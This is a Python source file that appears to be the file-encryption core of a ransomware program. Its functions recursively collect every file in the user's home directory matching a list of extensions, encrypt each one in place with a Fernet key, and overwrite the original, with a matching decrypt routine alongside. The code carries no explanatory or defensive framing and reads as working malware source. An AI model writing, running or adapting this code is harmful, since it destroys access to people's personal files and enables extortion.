import os
import mmap
import shutil
from pathlib import Path
from cryptography.fernet import Fernet
from lib.modules.yaml import safe_load


def Process_Files(Private: Fernet, mode: str) -> None:
    for _, files in List_Files().items():
        for file in files:
            temp_file = file + '.temp'
            try:
                with open(file, 'rb') as original_file, open(temp_file, 'wb', buffering=4096*1024) as temp_file:
                    with mmap.mmap(original_file.fileno(), 0, access=mmap.ACCESS_READ) as mm:
                        offset = 0
                        while offset < len(mm):
                            chunk = mm[offset:offset + 4096 * 1024]
                            if not chunk:
                                break
                            processed_chunk = Private.encrypt(chunk) if mode == 'encrypt' else Private.decrypt(chunk)
                            temp_file.write(processed_chunk)
                            offset += len(chunk)
                shutil.move(temp_file.name, file)
            except Exception:
                if os.path.exists(temp_file.name):
                    os.remove(temp_file.name)


def Encrypt(Private: Fernet) -> None:
    Process_Files(Private, 'encrypt')


def Decrypt(Private: Fernet) -> None:
    Process_Files(Private, 'decrypt')


def List_Files() -> dict:
    
    with open('scripts/extensions.yaml', 'r') as file:
        exts = safe_load(file)

    file_categories = {category: [] for category in exts}
    extcategory = {ext: category for category, ext_list in exts.items() for ext in ext_list}

    for entry in Path.home().rglob('*'):
        if entry.is_file() and (ext := entry.suffix.lower()) in extcategory:
            file_categories[extcategory[ext]].append(str(entry))

    return file_categories